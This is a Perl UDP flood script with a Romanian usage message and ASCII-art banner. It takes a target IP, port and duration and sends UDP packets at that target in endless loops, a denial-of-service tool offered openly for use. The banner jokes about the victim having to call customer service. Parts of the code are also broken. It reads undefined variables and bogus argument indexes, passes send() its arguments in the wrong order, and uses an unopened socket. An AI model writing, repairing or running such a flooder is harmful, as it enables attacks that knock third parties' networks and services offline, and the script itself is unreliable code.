#!/usr/bin/perl


use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
 printf "############################################\n";
 printf "# Comanda este perl $0 IP port timp #\n";
 printf "# Ai gresit comanda SaMi Nicu !            #\n";
 printf "# Astept sa o copiezi si p'asta SaMi       #\n";
 printf "############################################\n";
 exit(1);
}

my ($ip,$port,$size,$time);
 $ip=$ARGV[0];
 $port=$ARGV[1]; 
 $time=$ARGV[2];

socket(moshu, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "[0;32mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MM FLooD 2k17 MMMMMMMMMMMMMMMNmmddhyyyyyhhdmmNNMMMMMMMMMMMM eRRoR 404 MMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMmhs+++++++++++++++++oymNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNy+//////////////////////smNMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMNmddyyyyyyyyyyyyyyyyyyyyyyyyyhdmmNMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMmyosooso++++++++++++++++osoosoosymMMMMMMMMMMMMMMMMMMMM
MM SaL Pa Net MMMMMMMmdhyyhys////////////////hyyyyhshdmMM FLooD DauDinOzn M
MMMMMMMMMMMMMMMMMMMMNmsosoosoooooooooooooooooosoosoosymMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMNNNmhsssssssssssssssssssssssssssssssssydNNNMMMMMMMMMMMMMMMM
MMMMMMMMMNNmdhyso+++++++++++++++++++++++++++++++++++++++++ooyhdmNNMMMMMMMMM
MMMMNmdhso++////////////////////////////////////////////////////+osydmNMMMM
MNmyo+///////////////////////////////////////////////////////////////+oydNM
mmhyyyyyyyyyyssssssssyyyyyyysssssssssssssssssssyyyyyyssssssssyyyyyyyyyyyhdm
MMMMMMMMMMMMNdso+++ohNMMMMMNdyo+////////////+shNMMMMNhso++osdNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMNNNNNMMMMMMMMMMNmdhyyyyyyyhdmNNMMMMMMMMNNNNNNMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M Au venit extraterestri sa-i rapeasca stalpul ### 502 Host ERRoR MMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n";
printf "[0;31m###############################################################################\n";
printf "[0;31m# In momentu' de spate victima suna la relatii cu clientii # cybernetik.3x.ro #\n";
printf "[0;31m###############################################################################\n";


if ($ARGV[1] ==0 && $ARGV[65500] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[65500] !=0) {
 system("(sleep $time;killall -9 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[65500] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[65500] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}
packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(moshu, 0, $size, sockaddr_in($port, $iaddr));
} 
randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 for (;time() <= $endtime;) {
 $psize = $size ? $size : int(rand(45000-65500)+65000) ;
 $pport = $port ? $port : int(rand(65500))+9;
 
 send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
}
